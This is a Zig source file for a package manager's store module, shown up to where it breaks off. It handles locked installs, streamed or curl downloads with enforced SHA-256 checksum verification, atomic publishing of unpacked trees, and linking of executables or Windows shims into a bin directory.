//! The package store: install, link, verify, diagnose, remove.

const std = @import("std");
const builtin = @import("builtin");

const registry = @import("registry.zig");
const platform = @import("platform.zig");
const safepath = @import("safepath.zig");
const archive = @import("archive.zig");
const net = @import("net.zig");
const term = @import("term.zig");
const wal = @import("wal.zig");
const bloom = @import("bloom.zig");
const abvindex = @import("abvindex.zig");
const stream = @import("stream.zig");
const ghrelease = @import("ghrelease.zig");
const ghverify = @import("ghverify.zig");
const bindetect = @import("bindetect.zig");
const shim = @import("shim.zig");

pub const Package = registry.Package;

pub const InstallOptions = struct {
    micro_split: bool = false,
    /// Download fully before unpacking, instead of streaming the unpack.
    no_stream: bool = false,
    /// Shared HTTP session for streamed installs. Null means the curl path.
    session: ?*stream.Session = null,
    /// Permit installing a payload whose checksum does not match, or that has
    /// no pinned checksum at all. Off by default.
    allow_unverified: bool = false,
    /// Replace bin links that already exist and were not installed by this
    /// package. Without it such a conflict is refused.
    force: bool = false,
    quiet: bool = false,
    /// Written to `<store dir>/.abv0-source` before the install is published.
    /// `gh:` installs record `gh:owner/repo@tag` here so upgrade can find the
    /// project again.
    source_note: ?[]const u8 = null,
};

pub const StoreError = error{
    UnsupportedPlatform,
    DownloadFailed,
    UnpackFailed,
    InvalidPackageIdentifier,
    ChecksumMismatch,
    ChecksumMissing,
    DownloadLooksLikeErrorPage,
    ArchiveTypeMismatch,
    UnknownArchiveType,
    ExecutableNotFound,
    RefusedUnverifiedInstall,
    BinaryConflict,
    ReservedBinaryName,
    UnsafeDefaultBranch,
    /// `gh:` installs.
    InvalidGithubSpec,
    ReleaseUnavailable,
    NoMatchingAsset,
    NotInCatalog,
};

/// `install` prints a specific, actionable diagnostic for every failure it
/// understands. Callers consult this so they do not print a second, terser
/// copy of a message the user has already read.
pub fn alreadyDiagnosed(e: anyerror) bool {
    return switch (e) {
        StoreError.UnsupportedPlatform,
        StoreError.DownloadFailed,
        StoreError.UnpackFailed,
        StoreError.ChecksumMismatch,
        StoreError.ChecksumMissing,
        StoreError.DownloadLooksLikeErrorPage,
        StoreError.RefusedUnverifiedInstall,
        StoreError.BinaryConflict,
        StoreError.ReservedBinaryName,
        StoreError.UnsafeDefaultBranch,
        StoreError.InvalidGithubSpec,
        StoreError.ReleaseUnavailable,
        StoreError.NoMatchingAsset,
        StoreError.NotInCatalog,
        StoreError.ExecutableNotFound,
        => true,
        else => false,
    };
}

/// Result of resolving an installed package directory name.
pub const Installed = struct {
    version: []const u8,
    dir_name: []const u8,
};

pub const Store = struct {
    allocator: std.mem.Allocator,
    home: []u8,
    root: []u8,
    store_root: []u8,
    bin_root: []u8,
    shells_root: []u8,
    apps_root: []u8,
    registry_root: []u8,
    locks_root: []u8,

    pub fn init(allocator: std.mem.Allocator) !Store {
        const home = try platform.homeDir(allocator);
        errdefer allocator.free(home);

        // ABV0_HOME, ABV0_BIN_DIR and ABV0_REGISTRY_DIR match the installers.
        const root = platform.homeOverride(allocator) orelse try std.fs.path.join(allocator, &.{ home, ".abv0" });
        errdefer allocator.free(root);
        const store_root = try std.fs.path.join(allocator, &.{ root, "store" });
        errdefer allocator.free(store_root);
        const bin_root = platform.binDirOverride(allocator) orelse try std.fs.path.join(allocator, &.{ root, "bin" });
        errdefer allocator.free(bin_root);
        const shells_root = try std.fs.path.join(allocator, &.{ root, "shells" });
        errdefer allocator.free(shells_root);
        const registry_root = platform.registryDirOverride(allocator) orelse try std.fs.path.join(allocator, &.{ root, "registry" });
        errdefer allocator.free(registry_root);
        const locks_root = try std.fs.path.join(allocator, &.{ root, "locks" });
        errdefer allocator.free(locks_root);

        // GUI bundles only mean something on macOS; the original created
        // ~/Applications on Linux too.
        const apps_root = if (platform.is_macos)
            try std.fs.path.join(allocator, &.{ home, "Applications" })
        else
            try std.fs.path.join(allocator, &.{ root, "apps" });
        errdefer allocator.free(apps_root);

        // These used to be four makePath calls plus three `chmod` subprocess
        // spawns on every single invocation, including `abv0 help`. Now the
        // chmod is only paid for a directory that is new or has the wrong mode.
        for ([_][]const u8{ root, store_root, bin_root, shells_root, registry_root, locks_root }) |d| {
            platform.ensureSecureDir(d) catch {};
        }

        return .{
            .allocator = allocator,
            .home = home,
            .root = root,
            .store_root = store_root,
            .bin_root = bin_root,
            .shells_root = shells_root,
            .apps_root = apps_root,
            .registry_root = registry_root,
            .locks_root = locks_root,
        };
    }

    pub fn deinit(self: *Store) void {
        const a = self.allocator;
        a.free(self.home);
        a.free(self.root);
        a.free(self.store_root);
        a.free(self.bin_root);
        a.free(self.shells_root);
        a.free(self.apps_root);
        a.free(self.registry_root);
        a.free(self.locks_root);
        self.* = undefined;
    }

    // -----------------------------------------------------------------------
    // Paths
    // -----------------------------------------------------------------------

    /// Store directory name: `name@version@platform`. '@' is not allowed in a
    /// valid identifier, so the three fields can always be split apart again.
    /// (The old `name-version-platform` form was ambiguous: `a-1` + `2` and
    /// `a` + `1-2` produced the same directory.)
    pub fn storeDirName(
        allocator: std.mem.Allocator,
        pkg: Package,
        platform_name: []const u8,
    ) ![]u8 {
        if (!safepath.isValidId(pkg.name) or
            !safepath.isValidId(pkg.version) or
            !safepath.isValidId(platform_name))
        {
            return StoreError.InvalidPackageIdentifier;
        }
        return std.fmt.allocPrint(allocator, "{s}@{s}@{s}", .{ pkg.name, pkg.version, platform_name });
    }

    pub const StoreDirName = struct {
        name: []const u8,
        version: []const u8,
        platform: []const u8,
    };

    /// Inverse of `storeDirName`. Returns null for anything that is not a
    /// current-format package directory: old `-`-separated directories, temp
    /// directories, the WAL directory and so on. Those are ignored, not removed.
    pub fn parseStoreDirName(dir_name: []const u8) ?StoreDirName {
        if (std.mem.endsWith(u8, dir_name, ".tmp")) return null;
        const first = std.mem.indexOfScalar(u8, dir_name, '@') orelse return null;
        const rest = dir_name[first + 1 ..];
        const second = std.mem.indexOfScalar(u8, rest, '@') orelse return null;
        const parsed = StoreDirName{
            .name = dir_name[0..first],
            .version = rest[0..second],
            .platform = rest[second + 1 ..],
        };
        if (std.mem.indexOfScalar(u8, parsed.platform, '@') != null) return null;
        if (!safepath.isValidId(parsed.name) or
            !safepath.isValidId(parsed.version) or
            !safepath.isValidId(parsed.platform))
        {
            return null;
        }
        return parsed;
    }

    pub fn pkgStorePath(
        self: *const Store,
        allocator: std.mem.Allocator,
        pkg: Package,
        platform_name: []const u8,
    ) ![]u8 {
        const dir_name = try storeDirName(allocator, pkg, platform_name);
        defer allocator.free(dir_name);
        return std.fs.path.join(allocator, &.{ self.store_root, dir_name });
    }

    pub fn isInstalled(self: *const Store, pkg: Package, platform_name: []const u8) bool {
        var buf: [std.fs.MAX_PATH_BYTES]u8 = undefined;
        var fba = std.heap.FixedBufferAllocator.init(&buf);
        const p = self.pkgStorePath(fba.allocator(), pkg, platform_name) catch return false;
        var dir = std.fs.cwd().openDir(p, .{}) catch return false;
        dir.close();
        return true;
    }

    /// Which versions of `name` are present in the store for `platform_name`.
    /// This is the information `outdated` needs and never had.
    pub fn installedVersions(
        self: *const Store,
        allocator: std.mem.Allocator,
        name: []const u8,
        platform_name: []const u8,
    ) ![]Installed {
        var out = std.ArrayList(Installed).init(allocator);
        errdefer out.deinit();

        var dir = std.fs.cwd().openDir(self.store_root, .{ .iterate = true }) catch return out.toOwnedSlice();
        defer dir.close();

        // Exact comparison of the parsed name field. A prefix match would make
        // `jq` claim the directories of `jq-extra`.
        var it = dir.iterate();
        while (try it.next()) |entry| {
            if (entry.kind != .directory) continue;
            const parsed = parseStoreDirName(entry.name) orelse continue;
            if (!std.mem.eql(u8, parsed.name, name)) continue;
            if (!std.mem.eql(u8, parsed.platform, platform_name)) continue;

            try out.append(.{
                .version = try allocator.dupe(u8, parsed.version),
                .dir_name = try allocator.dupe(u8, entry.name),
            });
        }
        return out.toOwnedSlice();
    }

    /// One store directory, as `scanStore` reports it.
    const StoreEntry = struct {
        platform: []const u8,
        version: []const u8,
        dir_name: []const u8,
    };

    /// Every package directory in the store root, grouped by package name.
    const StoreIndex = std.StringHashMap(std.ArrayList(StoreEntry));

    /// Read the store root once. Callers answer per package from the result,
    /// where they used to re-scan the directory for each package. Everything
    /// is allocated from `a`, so pass an arena that outlives the index.
    fn scanStore(self: *const Store, a: std.mem.Allocator) !StoreIndex {
        var index = StoreIndex.init(a);

        var dir = std.fs.cwd().openDir(self.store_root, .{ .iterate = true }) catch return index;
        defer dir.close();

        var it = dir.iterate();
        while (try it.next()) |entry| {
            if (entry.kind != .directory) continue;
            const parsed = parseStoreDirName(entry.name) orelse continue;

            const gop = try index.getOrPut(parsed.name);
            if (!gop.found_existing) {
                gop.key_ptr.* = try a.dupe(u8, parsed.name);
                gop.value_ptr.* = std.ArrayList(StoreEntry).init(a);
            }
            try gop.value_ptr.append(.{
                .platform = try a.dupe(u8, parsed.platform),
                .version = try a.dupe(u8, parsed.version),
                .dir_name = try a.dupe(u8, entry.name),
            });
        }
        return index;
    }

    // -----------------------------------------------------------------------
    // Install
    // -----------------------------------------------------------------------

    /// Blocking, cross-process exclusive lock for one package.
    /// Replaces the "lock-free file semaphore" that was a file containing the
    /// text LOCKED_BY_WORKER and enforced nothing.
    /// Lock name guarding the bin/app ownership file. Taken after the package
    /// lock where both are needed, so the order is always package, then owners.
    const owners_lock = "bin-owners";

    const Guard = struct {
        file: std.fs.File,

        fn acquire(allocator: std.mem.Allocator, locks_root: []const u8, name: []const u8) !Guard {
            if (!safepath.isValidId(name)) return StoreError.InvalidPackageIdentifier;
            const p = try std.fmt.allocPrint(allocator, "{s}/{s}.lock", .{ locks_root, name });
            defer allocator.free(p);

            const file = try std.fs.cwd().createFile(p, .{ .read = true, .truncate = false, .mode = platform.mode_private });
            errdefer file.close();
            try file.lock(.exclusive);
            return .{ .file = file };
        }

        fn release(self: *Guard) void {
            self.file.unlock();
            self.file.close();
        }
    };

    pub fn install(
        self: *Store,
        pkg: Package,
        platform_name: []const u8,
        opts: InstallOptions,
    ) !void {
        // Per-call arena: install runs on worker threads, and the previous code
        // shared one non-thread-safe ArenaAllocator across all of them.
        var arena_state = std.heap.ArenaAllocator.init(self.allocator);
        defer arena_state.deinit();
        const a = arena_state.allocator();

        if (!safepath.isValidId(platform_name)) return StoreError.InvalidPackageIdentifier;

        const info = pkg.platform(platform_name) orelse {
            term.err("{s}error{s}: '{s}' has no build for platform '{s}'\n", .{ term.red, term.reset, pkg.name, platform_name });
            return StoreError.UnsupportedPlatform;
        };

        const pkg_dir = try self.pkgStorePath(a, pkg, platform_name);

        var guard = try Guard.acquire(a, self.locks_root, pkg.name);
        defer guard.release();

        // One WAL handle per install. A second handle on the same log would
        // keep its own sequence counter and write duplicate seq numbers.
        var w = try wal.Wal.init(a, self.store_root, pkg.name);
        defer w.deinit();

        // Re-check under the lock: another worker may have just finished.
        if (!self.isInstalled(pkg, platform_name)) {
            try self.fetchAndUnpack(a, pkg, info, pkg_dir, opts, &w);
        } else if (!opts.quiet) {
            term.print("  {s}cached{s}  {s} {s}\n", .{ term.dim, term.reset, pkg.name, pkg.version });
        }

        try w.append(.link);

        const linked = try self.linkBinaries(a, pkg, info, pkg_dir, opts);
        try self.linkAppBundles(a, pkg, pkg_dir, opts);

        try w.append(.complete);

        if (!opts.quiet and linked == 0 and pkg.bin.len > 0) {
            term.err(
                "{s}warning{s}: no executables from '{s}' were found in the unpacked archive\n",
                .{ term.yellow, term.reset, pkg.name },
            );
        }
    }

    fn fetchAndUnpack(
        self: *Store,
        a: std.mem.Allocator,
        pkg: Package,
        info: registry.PlatformInfo,
        pkg_dir: []const u8,
        opts: InstallOptions,
        w: *wal.Wal,
    ) !void {
        if (w.hasUnfinishedInstall() catch false) {
            if (!opts.quiet) {
                term.print("  {s}recovering{s} interrupted install of {s}\n", .{ term.yellow, term.reset, pkg.name });
            }
            self.pruneTempDirs(a, pkg.name) catch {};
        }
        try w.append(.init);
        errdefer w.append(.failed) catch {};

        // Unpredictable temp directory name, cleaned up on every failure path.
        const tmp_dir = try std.fmt.allocPrint(a, "{s}.{x}.tmp", .{ pkg_dir, std.crypto.random.int(u64) });
        std.fs.cwd().deleteTree(tmp_dir) catch {};
        try platform.makeSecureDir(tmp_dir);
        errdefer std.fs.cwd().deleteTree(tmp_dir) catch {};

        const archive_path = try std.fs.path.join(a, &.{ tmp_dir, "payload" });
        const raw_name = if (info.bin_path.len > 0)
            info.bin_path
        else if (pkg.primaryBin()) |b| b else pkg.name;

        // ---- fetch ----
        try w.append(.fetch);
        if (!opts.quiet) term.print("  {s}fetch{s}    {s} {s}\n", .{ term.cyan, term.reset, pkg.name, pkg.version });

        // Fast path: hash, decode and unpack while the bytes arrive. Nothing is
        // published until the digest is checked below, so a failed stream
        // leaves no trace in the store. Any error other than a checksum
        // mismatch falls through to the curl path, which reports it properly.
        var streamed: ?stream.Result = null;
        var payload: ?Digest = null;
        if (!opts.no_stream and !opts.micro_split) {
            if (opts.session) |session| {
                if (session.streamingEnabled()) {
                    if (archive.Kind.fromString(info.archive_type) orelse archive.Kind.fromFilename(info.url)) |declared| {
                        if (streamInto(session, a, info.url, declared, raw_name, tmp_dir)) |res| {
                            streamed = res;
                        } else |e| {
                            // A zip or dmg was never attempted, so it says nothing about the network.
                            if (e != error.NotStreamable) session.disableStreaming();
                            // Whatever the stream wrote is untrusted; start the staging directory over.
                            std.fs.cwd().deleteTree(tmp_dir) catch {};
                            try platform.makeSecureDir(tmp_dir);
                            if (!opts.quiet) {
                                term.print("  {s}stream unavailable ({s}), using curl{s}\n", .{ term.dim, @errorName(e), term.reset });
                            }
                        }
                    }
                }
            }
        }

        var sum: [32]u8 = undefined;
        if (streamed) |res| {
            sum = res.digest;
        } else {
            // The payload is read once after it lands, for its digest and its
            // leading bytes. A micro-split download already has both from the
            // pass that reassembled its parts, so it does not read the file again.
            var fetched: ?Digest = null;
            if (opts.micro_split) {
                fetched = self.microSplitDownload(a, info.url, archive_path, tmp_dir) catch null;
            }
            var p = fetched orelse blk: {
                net.download(a, info.url, archive_path, .{}) catch |e| {
                    term.err("{s}error{s}: download failed for {s}: {s}\n", .{ term.red, term.reset, pkg.name, @errorName(e) });
                    return StoreError.DownloadFailed;
                };
                break :blk try digestFile(archive_path);
            };

            // A CDN error page is not a package. curl without --fail used to let
            // these straight through into ~/.abv0/bin.
            if (archive.looksLikeErrorPageBytes(p.head())) {
                term.err(
                    "{s}error{s}: the server returned an error page, not an archive, for {s}\n  {s}\n",
                    .{ term.red, term.reset, pkg.name, info.url },
                );
                return StoreError.DownloadLooksLikeErrorPage;
            }
            sum = p.final();
            payload = p;
        }

        // ---- verify ----
        try w.append(.verify);
        var digest_hex: [64]u8 = undefined;
        _ = std.fmt.bufPrint(&digest_hex, "{s}", .{std.fmt.fmtSliceHexLower(&sum)}) catch unreachable;

        try self.verifyChecksum(pkg, info, &digest_hex, opts);
        if (!opts.quiet) term.print("  {s}verify{s}   {s}\n", .{ term.green, term.reset, digest_hex[0..16] });

        // ---- unpack ----
        try w.append(.unpack);

        // A streamed install was already unpacked during the fetch.
        if (payload) |*p| {
            const declared = archive.Kind.fromString(info.archive_type) orelse
                archive.Kind.fromFilename(info.url) orelse
                return StoreError.UnknownArchiveType;

            // Trust the bytes over the manifest: if the payload sniffs as a
            // different container, use what it actually is.
            const actual = archive.sniffBytes(p.head());
            const kind = if (declared == .raw or declared == .dmg)
                declared
            else if (actual) |k| k else declared;

            archive.extract(a, kind, archive_path, tmp_dir, .{ .raw_name = raw_name }) catch |e| {
                term.err("{s}error{s}: could not unpack {s}: {s}\n", .{ term.red, term.reset, pkg.name, @errorName(e) });
                return StoreError.UnpackFailed;
            };

            // The payload file itself is not part of the installed tree.
            std.fs.cwd().deleteFile(archive_path) catch {};
        }

        if (opts.source_note) |note| {
            const note_path = try std.fs.path.join(a, &.{ tmp_dir, source_file });
            const f = try std.fs.cwd().createFile(note_path, .{ .mode = platform.mode_public });
            defer f.close();
            try f.writeAll(note);
        }

        try publishTree(a, tmp_dir, pkg_dir);
    }

    /// File in a store directory that says where a `gh:` install came from.
    pub const source_file = ".abv0-source";

    /// Stream `url` into the staging directory. Opening the directory is part
    /// of the attempt, so a failure there also falls back to curl.
    fn streamInto(
        session: *stream.Session,
        a: std.mem.Allocator,
        url: []const u8,
        declared: archive.Kind,
        raw_name: []const u8,
        tmp_dir: []const u8,
    ) !stream.Result {
        var dir = try std.fs.cwd().openDir(tmp_dir, .{});
        defer dir.close();
        return stream.streamInstall(session, a, url, declared, raw_name, dir);
    }

    /// Swap a finished extraction into place. An existing install is moved
    /// aside first, so a crash leaves either the old or the new tree at
    /// `pkg_dir`. The set-aside copy ends in `.tmp`, so gc reclaims it if we
    /// die before deleting it.
    fn publishTree(a: std.mem.Allocator, tmp_dir: []const u8, pkg_dir: []const u8) !void {
        var old: ?[]const u8 = null;
        if (std.fs.cwd().access(pkg_dir, .{})) |_| {
            const aside = try std.fmt.allocPrint(a, "{s}.old.{x}.tmp", .{ pkg_dir, std.crypto.random.int(u64) });
            try std.fs.cwd().rename(pkg_dir, aside);
            old = aside;
        } else |_| {}

        std.fs.cwd().rename(tmp_dir, pkg_dir) catch |e| {
            if (old) |o| std.fs.cwd().rename(o, pkg_dir) catch {};
            return e;
        };
        if (old) |o| std.fs.cwd().deleteTree(o) catch {};
    }

    test "publish over an existing install leaves only the new tree" {
        var tmp = testing.tmpDir(.{ .iterate = true });
        defer tmp.cleanup();
        var arena = std.heap.ArenaAllocator.init(testing.allocator);
        defer arena.deinit();
        const a = arena.allocator();
        const root = try tmp.dir.realpathAlloc(a, ".");

        try tmp.dir.makePath("jq@1.0@x86_64-linux");
        try tmp.dir.writeFile(.{ .sub_path = "jq@1.0@x86_64-linux/old", .data = "old" });
        try tmp.dir.makePath("jq@1.0@x86_64-linux.1f.tmp");
        try tmp.dir.writeFile(.{ .sub_path = "jq@1.0@x86_64-linux.1f.tmp/new", .data = "new" });

        const pkg_dir = try std.fs.path.join(a, &.{ root, "jq@1.0@x86_64-linux" });
        const tmp_dir = try std.fs.path.join(a, &.{ root, "jq@1.0@x86_64-linux.1f.tmp" });
        try publishTree(a, tmp_dir, pkg_dir);

        const got = try tmp.dir.readFileAlloc(a, "jq@1.0@x86_64-linux/new", 64);
        try testing.expectEqualStrings("new", got);
        try testing.expectError(error.FileNotFound, tmp.dir.access("jq@1.0@x86_64-linux/old", .{}));
        try testing.expectError(error.FileNotFound, tmp.dir.access("jq@1.0@x86_64-linux.1f.tmp", .{}));

        // Only the install itself remains in the store root.
        var it = tmp.dir.iterate();
        var entries: usize = 0;
        while (try it.next()) |entry| {
            entries += 1;
            try testing.expectEqualStrings("jq@1.0@x86_64-linux", entry.name);
        }
        try testing.expectEqual(@as(usize, 1), entries);
    }

    fn verifyChecksum(
        self: *Store,
        pkg: Package,
        info: registry.PlatformInfo,
        digest_hex: []const u8,
        opts: InstallOptions,
    ) !void {
        _ = self;

        if (!info.checksumIsPinned()) {
            // Previously every unpinned or malformed hash silently passed.
            if (opts.allow_unverified) return;
            term.err(
                \\{s}error{s}: '{s}' has no pinned sha256 for this platform.
                \\  Installing it would execute unverified code.
                \\  Re-run with --allow-unverified to accept that risk.
                \\
            , .{ term.red, term.reset, pkg.name });
            return StoreError.ChecksumMissing;
        }

        if (std.ascii.eqlIgnoreCase(digest_hex, info.sha256)) return;

        if (opts.allow_unverified) {
            term.err(
                "{s}warning{s}: checksum mismatch for {s} accepted because --allow-unverified was given\n",
                .{ term.yellow, term.reset, pkg.name },
            );
            return;
        }

        // This is the v0.9.1 "smart rolling release hash mismatch bypass".
        // It turned integrity checking off for every package.
        term.err(
            \\{s}error{s}: checksum mismatch for '{s}'
            \\  expected {s}
            \\  actual   {s}
            \\  Refusing to install. The download may be corrupt, or the manifest may be out of date.
            \\
        , .{ term.red, term.reset, pkg.name, info.sha256, digest_hex });
        return StoreError.ChecksumMismatch;
    }

    /// What one pass over a payload yields: its SHA-256 and its leading bytes,
    /// which the error-page check and the type sniff both read.
    const Digest = struct {
        hasher: std.crypto.hash.sha2.Sha256,
        head_buf: [archive.head_len]u8,
        head_len: usize,

        fn init() Digest {
            return .{
                .hasher = std.crypto.hash.sha2.Sha256.init(.{}),
                .head_buf = undefined,
                .head_len = 0,
            };
        }

        fn update(self: *Digest, bytes: []const u8) void {
            self.hasher.update(bytes);
            if (self.head_len < archive.head_len) {
                const take = @min(archive.head_len - self.head_len, bytes.len);
                @memcpy(self.head_buf[self.head_len..][0..take], bytes[0..take]);
                self.head_len += take;
            }
        }

        fn head(self: *const Digest) []const u8 {
            return self.head_buf[0..self.head_len];
        }

        fn final(self: *Digest) [32]u8 {
            var out: [32]u8 = undefined;
            self.hasher.final(&out);
            return out;
        }
    };

    /// Single streaming pass. The archive used to be read end to end three
    /// times: once by the hasher, once by the block store, once by tar.
    fn digestFile(path: []const u8) !Digest {
        const file = try std.fs.cwd().openFile(path, .{});
        defer file.close();

        var d = Digest.init();
        var buf: [64 * 1024]u8 = undefined;
        while (true) {
            const n = try file.read(&buf);
            if (n == 0) break;
            d.update(buf[0..n]);
        }
        return d;
    }

    fn pruneTempDirs(self: *Store, a: std.mem.Allocator, name: []const u8) !void {
        var dir = std.fs.cwd().openDir(self.store_root, .{ .iterate = true }) catch return;
        defer dir.close();

        const prefix = try std.fmt.allocPrint(a, "{s}@", .{name});
        defer a.free(prefix);

        var it = dir.iterate();
        while (try it.next()) |entry| {
            if (!std.mem.endsWith(u8, entry.name, ".tmp")) continue;
            if (!std.mem.startsWith(u8, entry.name, prefix)) continue;
            const p = try std.fs.path.join(a, &.{ self.store_root, entry.name });
            defer a.free(p);
            std.fs.cwd().deleteTree(p) catch {};
        }
    }

    // -----------------------------------------------------------------------
    // Linking
    // -----------------------------------------------------------------------

    /// Walk the unpacked tree ONCE and resolve every wanted executable.
    /// The original ran a full recursive walk per binary, so ffmpeg (3 bins)
    /// walked the whole tree three times.
    fn linkBinaries(
        self: *Store,
        a: std.mem.Allocator,
        pkg: Package,
        info: registry.PlatformInfo,
        pkg_dir: []const u8,
        opts: InstallOptions,
    ) !usize {
        if (pkg.bin.len == 0) return 0;

        var wanted = std.StringHashMap(?[]const u8).init(a);
        defer wanted.deinit();
        for (pkg.bin) |b| try wanted.put(b, null);

        // Some archives ship the executable under a different name than the
        // package advertises (bottom -> btm). bin_path names the real file.
        const alias_target = std.fs.path.basename(info.bin_path);
        var alias_path: ?[]const u8 = null;

        // bin_path names the real file, so look at that path before walking
        // the tree. Its name resolves a wanted bin without a walk.
        if (info.bin_path.len > 0) {
            if (safepath.joinSafe(a, pkg_dir, info.bin_path)) |exact| {
                if (isPlainFile(exact)) {
                    alias_path = exact;
                    if (wanted.getPtr(alias_target) orelse wanted.getPtr(stripExeSuffix(alias_target))) |slot| {
                        slot.* = exact;
                    }
                }
            } else |_| {}
        }

        // The walk is only needed for a wanted bin the exact path did not
        // resolve. A single-binary package never walks.
        var unresolved = false;
        var pending = wanted.valueIterator();
        while (pending.next()) |slot| {
            if (slot.* == null) {
                unresolved = true;
                break;
            }
        }

        if (unresolved) {
            var dir = std.fs.cwd().openDir(pkg_dir, .{ .iterate = true }) catch return 0;
            defer dir.close();

            var walker = try dir.walk(a);
            defer walker.deinit();

            while (try walker.next()) |entry| {
                if (entry.kind != .file) continue;

                const base = entry.basename;
                const stem = stripExeSuffix(base);

                if (wanted.getPtr(base) orelse wanted.getPtr(stem)) |slot| {
                    if (slot.* == null) {
                        slot.* = try std.fs.path.join(a, &.{ pkg_dir, entry.path });
                    }
                    continue;
                }
                if (alias_path == null and alias_target.len > 0 and
                    (std.mem.eql(u8, base, alias_target) or std.mem.eql(u8, stem, alias_target)))
                {
                    alias_path = try std.fs.path.join(a, &.{ pkg_dir, entry.path });
                }
            }
        }

        // Plan every link before touching the bin directory, so a refusal
        // leaves it exactly as it was.
        var plans = std.ArrayList(LinkPlan).init(a);
        var it = wanted.iterator();
        while (it.next()) |entry| {
            const bin_name = entry.key_ptr.*;
            const src = entry.value_ptr.* orelse alias_path orelse continue;

            if (!safepath.isValidId(bin_name)) return StoreError.InvalidPackageIdentifier;
            if (isReservedBin(bin_name)) {
                term.err("{s}error{s}: '{s}' is reserved for abv0 itself; not linking it\n", .{ term.red, term.reset, bin_name });
                return StoreError.ReservedBinaryName;
            }

            const dst_name = try std.fmt.allocPrint(a, "{s}{s}", .{ bin_name, platform.exe_suffix });
            const dst = try std.fs.path.join(a, &.{ self.bin_root, dst_name });
            try plans.append(.{ .bin = bin_name, .src = src, .dst = dst });
        }
        return self.linkPlans(a, pkg, plans.items, opts);
    }

    const LinkPlan = struct { bin: []const u8, src: []const u8, dst: []const u8 };

    /// Link every planned executable into the bin directory, recording each in
    /// the ownership file. Refuses the whole set if any destination belongs to
    /// someone else, so a refusal leaves the bin directory untouched.
    fn linkPlans(self: *Store, a: std.mem.Allocator, pkg: Package, plans: []const LinkPlan, opts: InstallOptions) !usize {
        return self.linkPlansFor(a, pkg, plans, opts, builtin.os.tag, null);
    }

    /// How an executable reaches the bin directory.
    pub const LinkMethod = enum {
        /// Windows: `<bin>\<name>.exe` is a copy/hard link of abv0.exe and
        /// `<bin>\<name>.shim` names the real executable in the store, so the
        /// loader searches the store directory (not bin) for DLLs.
        shim,
        /// Symlink / hard link / clonefile, as before.
        link,
        /// Windows script (.cmd/.bat/.ps1): cannot be launched through a shim
        /// and a copy named `.exe` would not run, so it is not linked.
        skip_script,
    };

    /// Pure decision: how to link `bin_path` (the executable inside the
    /// store) on `os`. Only Windows uses shims.
    pub fn linkMethodFor(os: std.Target.Os.Tag, bin_path: []const u8) LinkMethod {
        if (os != .windows) return .link;
        var ext: []const u8 = "";
        var i = bin_path.len;
        while (i > 0) {
            i -= 1;
            const c = bin_path[i];
            if (c == '/' or c == '\\') break;
            if (c == '.') {
                ext = bin_path[i..];
                break;
            }
        }
        for ([_][]const u8{ ".cmd", ".bat", ".ps1" }) |script| {
            if (std.ascii.eqlIgnoreCase(ext, script)) return .skip_script;
        }
        return .shim;
    }

    /// Create the launcher pair for one planned bin. The caller has already
    /// established that this package may take the name (owner, legacy or
    /// --force), so a leftover plain link or foreign exe is replaced.
    fn installShimPair(a: std.mem.Allocator, p: LinkPlan, self_exe: ?[]const u8) !void {
        const bin_dir = std.fs.path.dirname(p.dst) orelse ".";
        // A shim target must be absolute; a relative store root is resolved.
        var resolved: ?[]u8 = null;
        defer if (resolved) |r| a.free(r);
        const target: []const u8 = if (shim.isAbsoluteTarget(p.src)) p.src else blk: {
            resolved = try std.fs.cwd().realpathAlloc(a, p.src);
            break :blk resolved.?;
        };
        shim.writeShimWithSelf(a, bin_dir, p.bin, target, &.{}, self_exe) catch |e| switch (e) {
            error.WouldOverwriteNonShim => {
                // Typically a plain hard link left by an older abv0.
                _ = removeBinFiles(a, bin_dir, p.bin, .windows) catch false;
                try shim.writeShimWithSelf(a, bin_dir, p.bin, target, &.{}, self_exe);
            },
            else => return e,
        };
    }

    /// Delete the files that make up bin `name` in `bin_dir`. In shim mode
    /// that is the launcher exe and its `.shim`; otherwise only the exe/link.
    /// Returns whether anything was deleted. The `.shim` is kept when the
    /// launcher exe cannot be removed (it is running), so the pair stays
    /// consistent.
    fn removeBinFiles(a: std.mem.Allocator, bin_dir: []const u8, name: []const u8, os: std.Target.Os.Tag) !bool {
        var removed = false;
        const exe_name = try std.fmt.allocPrint(a, "{s}{s}", .{ name, platform.exe_suffix });
        defer a.free(exe_name);
        const exe_path = try std.fs.path.join(a, &.{ bin_dir, exe_name });
        defer a.free(exe_path);
        var exe_gone = false;
        if (std.fs.cwd().deleteFile(exe_path)) |_| {
            removed = true;
            exe_gone = true;
        } else |e| {
            exe_gone = e == error.FileNotFound;
        }
        if (os == .windows and exe_gone) {
            const shim_name = try std.fmt.allocPrint(a, "{s}{s}", .{ name, shim.shim_suffix });
            defer a.free(shim_name);
            const shim_path = try std.fs.path.join(a, &.{ bin_dir, shim_name });
            defer a.free(shim_path);
            if (std.fs.cwd().deleteFile(shim_path)) |_| {
                removed = true;
            } else |_| {}
        }
        return removed;
    }

    pub const BinHealth = enum { ok, missing_exe, missing_shim, bad_shim, missing_target };

    /// State of installed bin `name`. Off Windows this is just "does the link
    /// resolve"; on Windows the launcher pair must exist and its target too.
    pub fn binHealth(a: std.mem.Allocator, bin_dir: []const u8, name: []const u8, os: std.Target.Os.Tag) BinHealth {
        var arena = std.heap.ArenaAllocator.init(a);
        defer arena.deinit();
        const aa = arena.allocator();
        const exe_name = std.fmt.allocPrint(aa, "{s}{s}", .{ name, platform.exe_suffix }) catch return .missing_exe;
        const exe_path = std.fs.path.join(aa, &.{ bin_dir, exe_name }) catch return .missing_exe;
        std.fs.cwd().access(exe_path, .{}) catch return .missing_exe;
        if (os != .windows) return .ok;

        const shim_name = std.fmt.allocPrint(aa, "{s}{s}", .{ name, shim.shim_suffix }) catch return .bad_shim;
        const shim_path = std.fs.path.join(aa, &.{ bin_dir, shim_name }) catch return .bad_shim;
        const s = shim.readShimFile(aa, shim_path) catch |e| return if (e == error.FileNotFound) .missing_shim else .bad_shim;
        if (!platform.pathExists(s.path)) return .missing_target;
        return .ok;
    }

    /// Absolute store targets of every `.shim` in the bin directory: the
    /// shim-world counterpart of "where do the bin symlinks point", for code
    /// that must not delete a store directory a launcher still uses.
    pub fn binShimTargets(self: *const Store, a: std.mem.Allocator) ![][]const u8 {
        var out = std.ArrayList([]const u8).init(a);
        var dir = std.fs.cwd().openDir(self.bin_root, .{ .iterate = true }) catch return out.toOwnedSlice();
        defer dir.close();
        var it = dir.iterate();
        while (try it.next()) |entry| {
            if (entry.kind != .file) continue;
            if (!std.mem.endsWith(u8, entry.name, shim.shim_suffix)) continue;
            const path = try std.fs.path.join(a, &.{ self.bin_root, entry.name });
